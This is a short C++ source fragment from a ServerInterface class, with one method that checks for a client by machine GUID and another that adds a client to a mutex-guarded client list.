bool ServerInterface::ClientIsInClientList(const std::string& machineGUID) {
    for ( auto& [cuid, host] : this->m_ClientList )
        if ( host.GetMachineGUID() == machineGUID )
            return true;
    
    return false;
}


/**
 * Add a client to the servers client list.
 * 
 * \param client - the client to add
 * \return TRUE if the client was added.
 */
bool ServerInterface::AddToClientList(Client client) {    
    m_ClientListMutex.lock();    
    this->m_ClientList.insert(std::make_pair(client.ClientUID, client));
    m_ClientListMutex.unlock();
    
    return true;
}